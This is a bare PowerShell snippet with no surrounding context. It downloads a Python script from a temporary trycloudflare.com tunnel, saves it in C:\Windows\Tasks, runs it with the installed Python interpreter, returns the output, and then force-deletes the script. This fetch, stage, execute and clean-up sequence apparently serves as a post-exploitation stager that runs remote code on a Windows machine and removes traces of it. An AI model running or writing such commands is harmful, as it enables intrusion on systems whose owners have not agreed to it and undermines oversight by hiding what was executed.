$pyBytes = (Invoke-WebRequest -Uri "https://taxes-surprised-immediately-transportation.trycloudflare.com/scripts/debug_pe.py" -UseBasicParsing).Content
[System.IO.File]::WriteAllBytes("C:\Windows\Tasks\debug_pe.py", $pyBytes)
$result = & "C:\Program Files\Python310\python.exe" "C:\Windows\Tasks\debug_pe.py" 2>&1
$result -join "`n"
Remove-Item "C:\Windows\Tasks\debug_pe.py" -Force -ErrorAction SilentlyContinue
